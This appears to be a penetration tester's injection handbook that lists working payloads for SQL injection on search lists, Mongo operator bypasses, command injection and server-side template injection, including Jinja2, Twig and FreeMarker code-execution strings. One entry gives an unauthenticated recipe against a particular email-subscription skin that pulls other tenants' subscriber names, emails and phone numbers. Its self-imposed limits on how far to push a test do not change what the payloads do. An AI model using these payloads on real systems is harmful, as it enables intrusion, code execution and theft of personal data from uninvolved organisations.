> For intake-check completion criteria see `dig-scope` §4.2.1: for endpoints where you can observe changes in row counts/content, test every filter parameter; if it only returns "please log in", mark the whole section N/A. Choose probes by stack (JSON/Mongo operators, search boxes with ES, Java HQL/SpEL, SSTI where templating is present; for the SQL surface still use quotes/boolean/time-delay). After a 405, change position not just encoding.
> Use the title search for the short-form "list filter OR + total" and "email subscription iframe same-directory list" entries. WooYun statistics / sqlmap --os-shell / reverse shells / English attachments have been cut; adapt on site by stack, don't rely on the playbook.

# Injection Vulnerability Testing Handbook (SQLi / Command Injection / SSTI)

## SQL Injection

### List Filter OR + total (ES / Search Lists)

Lists such as corporate transactions, billing/consumption, and employee rosters filter on `employeeName` / name / keywords, and their responses carry `total` / `totalNum` / `totalSize`; the backend is often ES or a "search that can run a piece of SQL".

**This shot is risky.** On transaction/ES surfaces, `or (1)=(1)` amounts to "drop the tenant and date filters and match the entire database". Response totals in the hundreds of millions are common; a single query can saturate the cluster, drag the list down, and dump other companies' transaction records onto your screen. Stop once you have proof via **a numeric difference in total + the first row visibly not belonging to you**.

1. First enter a nonexistent string; the result should be empty or a few rows.  
2. Then boolean-false: `')and (1)=(2)--` should still be empty (proves you can alter the logic without yet opening up the whole database).  
3. Only then the always-true payload: `1')or (1)=(1)--+A` (if `1=1` is blocked, switch to `(1)=(1)`). **Fire only one shot.** Look only at total, keep pageSize at 1–5.  
4. Only count it when empty/single digits → hundreds of thousands, millions, hundreds of millions, and the first row is **another employee's / another company's** transaction record. Stop at proof.  
5. **Constraints for this shot only (OR always-true against the full ES/transaction database):** do not fire the same payload repeatedly or replay it, do not max out pageSize, do not click next page/export, do not use sqlmap `--dump` / `--risk=3` for this shot, and do not hit delete/update endpoints. Crashing the cluster does not count as proof.  
6. If fuzzy search treats `or` as a keyword, or everything that appears is data your own role may already read → false positive, do not report. If ES only accepts Query DSL and treats this SQL as an ordinary string → switch to DSL/`$where`, don't bang your head against it.

This is an opening move, not a restriction to only this one test, and **not** a ban on all injection data extraction. UNION / time-delay / error-based / WAF encoding / other injection endpoints — adapt on site by stack; prefer time-delay when it is safer than OR always-true.

### Email Subscription iframe Same-Directory list (Short-Form Pointer)

Identify it: the email subscription is embedded in an iframe; the same-directory list's `key` acts as authentication and is concatenated into SQL. Common skins are a subscription-form skin / `alertform.../main/index.php?id=tenant`.

Attack (without logging in):

1. Copy the tenant id from the iframe  
2. Hit the same-directory `GET /main/list.php?key=`  
3. `key` is concatenated into SQL as authentication. `1' OR client_id=TENANT LIMIT 1#` (just this one shot)

Counts as success: the response contains that tenant's subscriber names/emails/phone numbers. Wrong Key / an empty array are the controls.

False positives: no list.php; key uses constant comparison or prepared statements. If a single site misses, do not delete this short-form entry. Do not run FOFA across all sites with the same skin.

### Quick Detection

Single quote / boolean false-true / time delay. After a 405, switch between query / json / header / path. For the OR+total shot **do not** use sqlmap `--dump` / `--os-shell`.

### JSON / Mongo Operators (by stack, don't spray quotes at every path)

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`. Don't treat the login box as a business parameter. Only count it when another principal's data or a stable differential appears.

## Command Injection

Common endpoints: filename / ip / ping / conversion / diagnostic pages. Probes: `;id` / `|id` / `$(id)` / time delay `sleep 5`. Falsification is enough; don't use a local reverse shell as a playbook.

## SSTI (Server-Side Template Injection)

### Detection Payloads

```
{{7*7}}          → if it returns 49, SSTI is present
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### Common Framework Exploits

```python
# Jinja2 (Python/Flask)
{{config}}                           # Information disclosure
{{''.__class__.__mro__[2].__subclasses__()}}  # Obtain classes
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---
